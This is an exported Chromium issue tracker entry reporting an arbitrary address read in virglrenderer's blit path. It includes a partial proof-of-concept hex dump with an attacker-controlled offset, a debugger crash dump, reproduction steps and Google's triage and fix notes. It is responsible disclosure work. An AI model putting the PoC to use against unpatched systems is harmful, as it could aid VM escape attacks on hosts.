# Security: arbitrary address access in vrend_renderer_blit_gl

| Field | Value |
|-------|-------|
| **Issue ID** | [40072662](https://issues.chromium.org/issues/40072662) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Platforms** | ChromeOS |
| **Reporter** | da...@gmail.com |
| **Assignee** | ch...@google.com |
| **Created** | 2023-09-18 |
| **Bounty** | $2,000.00 |

## Description

---

### Report description


Security: arbitrary address access in vrend_renderer_blit_gl


---

### Bug location


#### Which product or website have you found a vulnerability in?

Google Chrome


---

### The problem


#### Please describe the technical details of the vulnerability

**VULNERABILTY DETAILS**
There's an arbitrary address access vunerability in virglrenderer. the function `vrend_renderer_blit_gl` calls `glDrawArrays`will trigger the issue [1], I haven't figured out the real root cause of this vulnerability. With editting the PoC, we can access a controlled arbitrary address (by heap OOB) [2] [3] [4].

```
void vrend_renderer_blit_gl(ASSERTED struct vrend_context *ctx,
                            struct vrend_resource *src_res,
                            struct vrend_resource *dst_res,
                            const struct vrend_blit_info *info)
{
   struct vrend_blitter_ctx *blit_ctx = &vrend_blit_ctx;

   ...

   for (dst_z = 0; dst_z < info->b.dst.box.depth; dst_z++) {
      float dst2src_scale = info->b.src.box.depth / (float)info->b.dst.box.depth;
      float dst_offset = ((info->b.src.box.depth - 1) -
                          (info->b.dst.box.depth - 1) * dst2src_scale) * 0.5;
      float src_z = (dst_z + dst_offset) * dst2src_scale;

      uint32_t layer = (dst_res->target == GL_TEXTURE_CUBE_MAP ||
                        dst_res->target == GL_TEXTURE_1D_ARRAY ||
                        dst_res->target == GL_TEXTURE_2D_ARRAY) ? info->b.dst.box.z : dst_z;

      vrend_fb_bind_texture_id(dst_res, info->dst_view, 0, info->b.dst.level, layer, 0);

      blitter_set_texcoords(blit_ctx, src_res, info->b.src.level,
                            info->b.src.box.z + src_z, 0,
                            src0.x, src0.y, src1.x, src1.y);

      glBufferData(GL_ARRAY_BUFFER, sizeof(blit_ctx->vertices), blit_ctx->vertices, GL_STATIC_DRAW);
      glDrawArrays(GL_TRIANGLE_FAN, 0, 4);                  //<-------------[1]
   }

   ...
```

```
PoC:
0000h: 10 20 15 00 01 08 05 00 00 7F FF 01 0A 00 00 00  . .......ÿ..... 
0010h: 0A 00 00 00 00 00 00 00 7F 00 00 00 00 00 00 00  ............... 
0020h: 00 00 00 00 00 00 01 08 05 00 00 00 01 08 05 00  ................ 
0030h: 00 7F FF 01 0A 00 00 00 AA AA AA 00 01 00 00 00  .ÿ.....ªªª.....      <-------- [2] edit the offset 0x38 of the PoC, here is 0xAAAAAA
0040h: 05 00 00 00 C4 01 00 00 00 01 00 00 04 00 00 00  ....Ä........... 
0050h: 43 4F 4D 50 0A 50 52 4F 50 45 52 54 59 20 43 53  COMP.PROPERTY CS 
0060h: 5F 46 49 58 45 44 5F 42 4C 4F 43 4B 5F 57 49 44  _FIXED_BLOCK_WID 
```

```
crash dump:
$rax   : 0xaaaaaa                                                                   <---------[3] , RAX is under control
$rbx   : 0x0000555555dc4b08  →  0x0000000000000000
$rcx   : 0x8               
$rdx   : 0x0               
$rsp   : 0x00007ffffffec630  →  0x01007fff00000000
$rbp   : 0x00007fffee4c3010  →  0x0000555555822350  →  0x0000000300000000
$rsi   : 0x0000555556725880  →  0x00005555567230c0  →  0x6c69662068637500
$rdi   : 0x00007fffee4c3010  →  0x0000555555822350  →  0x0000000300000000
$rip   : 0x00007ffff574a34c  →   mov rax, QWORD PTR [r12+rax*8+0x108]
$r8    : 0x45              
$r9    : 0x00007ffffffeb520  →  "FBO incomplete: no attachments and default width o[...]"
$r10   : 0x5               
$r11   : 0x1               
$r12   : 0x0000555555dc4af0  →  0x000001b200000002
$r13   : 0x8               
$r14   : 0x00007fffee4c3010  →  0x0000555555822350  →  0x0000000300000000
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffffffec630│+0x0000: 0x01007fff00000000   ← $rsp
0x00007ffffffec638│+0x0008: 0x0000000000000000
0x00007ffffffec640│+0x0010: 0x0000000000000001
0x00007ffffffec648│+0x0018: 0x0000000000000000
0x00007ffffffec650│+0x0020: 0x0000555556725880  →  0x00005555567230c0  →  0x6c69662068637500
0x00007ffffffec658│+0x0028: 0x00007ffff574a8ca  →   movzx edx, r12b
0x00007ffffffec660│+0x0030: 0x00007ffff682e3c0  →  "no attachments and default width or height is 0"
0x00007ffffffec668│+0x0038: 0xffffffff00000001
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff574a337                  je     0x7ffff574a416
   0x7ffff574a33d                  movsxd rax, DWORD PTR [r12+0x94]
   0x7ffff574a345                  movzx  edx, BYTE PTR [rdi+0x1523a]
 → 0x7ffff574a34c                  mov    rax, QWORD PTR [r12+rax*8+0x108]                <-------- [4] trigger 
   0x7ffff574a354                  test   rax, rax
   0x7ffff574a357                  je     0x7ffff574a380
   0x7ffff574a359                  cmp    DWORD PTR [rax+0x50], 0x1
   0x7ffff574a35d                  jbe    0x7ffff574a380
   0x7ffff574a35f                  movzx  eax, BYTE PTR [r12+0xd8]

```




**REPRDUCE**
poc is in the attachment.

1. compile the virgl_fuzzer
2. ./virgl_fuzzer ./poc


**CRASH LOG**
```
=================================================================
==3973662==ERROR: AddressSanitizer: SEGV on unknown address 0x61900564b0d8 (pc 0x7f96bf74a34c bp 0x7f96675be800 sp 0x7ffcd9846750 T0)
==3973662==The signal is caused by a READ memory access.
    #0 0x7f96bf74a34c  (/usr/lib/x86_64-linux-gnu/dri/swrast_dri.so+0x14a34c) (BuildId: d04a40e4062a8d444ff6f23d4fe768215b2e32c7)
    #1 0x7f96bf74a8c9  (/usr/lib/x86_64-linux-gnu/dri/swrast_dri.so+0x14a8c9) (BuildId: d04a40e4062a8d444ff6f23d4fe768215b2e32c7)
    #2 0x7f96bf726d77  (/usr/lib/x86_64-linux-gnu/dri/swrast_dri.so+0x126d77) (BuildId: d04a40e4062a8d444ff6f23d4fe768215b2e32c7)
    #3 0x7f96bf726e34  (/usr/lib/x86_64-linux-gnu/dri/swrast_dri.so+0x126e34) (BuildId: d04a40e4062a8d444ff6f23d4fe768215b2e32c7)
    #4 0x7f96bf8f5007  (/usr/lib/x86_64-linux-gnu/dri/swrast_dri.so+0x2f5007) (BuildId: d04a40e4062a8d444ff6f23d4fe768215b2e32c7)
    #5 0x7f96c7539743 in vrend_renderer_blit_gl (/home/dghost/fuzz/virg_test/virglrenderer/build/tests/fuzzer/../../src/libvirglrenderer.so.1+0x108743) (BuildId: b7946703e4da5fd274a54ca575a969ccf0556450)
    #6 0x7f96c74d33b2 in vrend_renderer_blit (/home/dghost/fuzz/virg_test/virglrenderer/build/tests/fuzzer/../../src/libvirglrenderer.so.1+0xa23b2) (BuildId: b7946703e4da5fd274a54ca575a969ccf0556450)
    #7 0x7f96c748d20a in vrend_decode_blit vrend_decode.c
    #8 0x7f96c7488812 in vrend_decode_ctx_submit_cmd vrend_decode.c
    #9 0x563bc297523f in LLVMFuzzerTestOneInput (/home/dghost/fuzz/virg_test/virglrenderer/build/tests/fuzzer/virgl_fuzzer+0x11823f) (BuildId: 18a2500a4af1a11c36525c3399e29e1d44a0fccd)
    #10 0x563bc289c1e2 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/dghost/fuzz/virg_test/virglrenderer/build/tests/fuzzer/virgl_fuzzer+0x3f1e2) (BuildId: 18a2500a4af1a11c36525c3399e29e1d44a0fccd)
    #11 0x563bc2886060 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/dghost/fuzz/virg_test/virglrenderer/build/tests/fuzzer/virgl_fuzzer+0x29060) (BuildId: 18a2500a4af1a11c36525c3399e29e1d44a0fccd)
    #12 0x563bc288bd27 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/dghost/fuzz/virg_test/virglrenderer/build/tests/fuzzer/virgl_fuzzer+0x2ed27) (BuildId: 18a2500a4af1a11c36525c3399e29e1d44a0fccd)
    #13 0x563bc28b5342 in main (/home/dghost/fuzz/virg_test/virglrenderer/build/tests/fuzzer/virgl_fuzzer+0x58342) (BuildId: 18a2500a4af1a11c36525c3399e29e1d44a0fccd)
    #14 0x7f96c6e29d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #15 0x7f96c6e29e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #16 0x563bc2880a04 in _start (/home/dghost/fuzz/virg_test/virglrenderer/build/tests/fuzzer/virgl_fuzzer+0x23a04) (BuildId: 18a2500a4af1a11c36525c3399e29e1d44a0fccd)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV (/usr/lib/x86_64-linux-gnu/dri/swrast_dri.so+0x14a34c) (BuildId: d04a40e4062a8d444ff6f23d4fe768215b2e32c7) 
==3973662==ABORTING
```


#### Please briefly explain who can exploit the vulnerability, and what they gain when doing so

VM escape on ChromeOS


---

### The cause


#### What version of Chrome have you found the security issue in?

Latest ChomeOS


#### Is the security issue related to a crash?

Yes


#### Choose the type of vulnerability

Chrome OS - Firmware Vulnerabilities 




## Attachments

- [aa_poc](attachments/aa_poc) (text/plain, 476 B)

## Timeline

### da...@gmail.com (2023-09-18)

[Empty comment from Monorail migration]

### ch...@appspot.gserviceaccount.com (2023-09-18)

[Empty comment from Monorail migration]

### nh...@google.com (2023-09-18)

[Empty comment from Monorail migration]

### ch...@google.com (2023-09-19)

Your report will be worked on in the Buganizer system (link: https://issuetracker.google.com/issues/301046198). You have been cc'ed on that report and should have access to it at this time to follow along while it is being worked on. We are setting Security_Severity-High as a default and the priority may either increase or decrease once their report is fully triaged and analyzed.

[Monorail blocking: b/301046198]

### [Deleted User] (2023-09-19)

[Empty comment from Monorail migration]

### ch...@google.com (2023-10-27)

Verified by 

akhna@google.com.
Exploitability - this was an arbitrary address access in the virglrenderer function vrend_renderer_blit_gl(). The issue is triggered by a call glDrawArrays() within that function, because of a missing bounds check in a mesa function _mesa_is_texture_complete().

The reporter attached a proof-of-concept example.

Privileges and Capabilities - The process exploited is virglrenderer, which is a host process running in a crosvm virtual-device sandbox.

Origin of fix - The issue was fixed upstream, then cherry-picked to M118 in crrev/c/4895487.

Mitigations - virglrenderer runs in a sandbox environment, but it still has significant memory access.

Severity assessment - Medium.

Not higher because based on the upstream fix, it’s not obvious that this can be used to trigger an arbitrary write (see https://gitlab.freedesktop.org/mesa/mesa/-/merge_requests/25332/diffs?commit_id=532618e324cb8e29d4c2bf28b4b7833ee217870c).

Not lower because an attacker may be able to read arbitrary addresses.

### [Deleted User] (2023-10-27)

[Empty comment from Monorail migration]

### [Deleted User] (2023-10-27)

[Empty comment from Monorail migration]

### ch...@google.com (2023-12-12)

[Empty comment from Monorail migration]

### am...@google.com (2023-12-15)

[Empty comment from Monorail migration]

### [Deleted User] (2024-02-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2024-02-02)

This issue was migrated from crbug.com/chromium/1483991?no_tracker_redirect=1

[Monorail blocking: b/301046198]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40072662)*
